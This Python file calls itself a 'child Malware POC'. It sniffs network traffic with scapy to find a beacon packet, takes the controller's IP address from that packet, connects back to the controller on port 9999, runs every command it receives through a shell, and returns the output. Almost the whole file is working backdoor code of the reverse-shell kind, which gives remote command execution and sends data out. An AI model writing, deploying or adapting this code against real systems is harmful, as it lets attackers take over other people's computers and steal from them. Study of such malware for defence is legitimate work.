#! /usr/bin/python
from __future__ import print_function
from scapy.all import *
import socket
import sys
import subprocess
import time

#print("hello")
print("Starting child Malware POC")
#print(sniff.__doc__)
## Create a Packet Counter
counter = 0

## Define our Custom Action function
def custom_action(packet):
    global counter
    counter += 1
    return 'Packet #{}: {} ==> {}'.format(counter, packet[0][1].src, packet[0][1].dst)

## Setup sniff, filtering for IP traffic
#sniff(filter="mac", prn=custom_action)
print("Sniffing")
#sniff(lfilter=lambda d: d.src == "aa:aa:aa:aa:bb:bb:bb:bb", prn=custom_action)
#sniff(filter='ether dst aa:aa:aa:aa:bb:bb',prn=custom_action)

packets = sniff(iface="\\Device\\NPF_{6D64678B-2267-4669-938F-1243F92A1F64}",filter='ether src aa:aa:aa:aa:bb:bb', count=2)
print("Packets captured with MAC OF aa:aa:aa:aa:bb:bb")
print(packets.summary())

for x in range(0,1):
    print(packets[x].show())
#print(packets[0].show())

print("The beacon malware is at :")
print(packets[0][Ether].src)

chief = (packets[0][ARP].psrc)
print("CHIEF IPADDRESS = ", chief)


time.sleep(10)
#============#
#Client section#
#socket_echo_client_explicit.py



# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port on the server
# given by the caller
server_address = (chief, 9999)
print('connecting to {} port {}'.format(*server_address))
sock.connect(server_address)

try:

    message = b'Client has Connected'
    print('sending {!r}'.format(message))
    sock.sendall(message)
    
    while True:
        #receiving Data from Chief
        data = sock.recv(1024)
        print('received {!r}'.format(data.decode()))
        #process message into cmd command
        command = data.decode()        
        
        #sending ack to Chief of receiving message
        #response = "received message"
        #sock.sendall(response.encode())
        
        if command:
            #cmdResult = subprocess.run(command, shell=True, check=True)
            cmdResult = subprocess.check_output(command, shell=True) # result is in bytes
            print(cmdResult)
            sock.sendall(cmdResult)
        else:
            break
        
               
finally:
    sock.close()
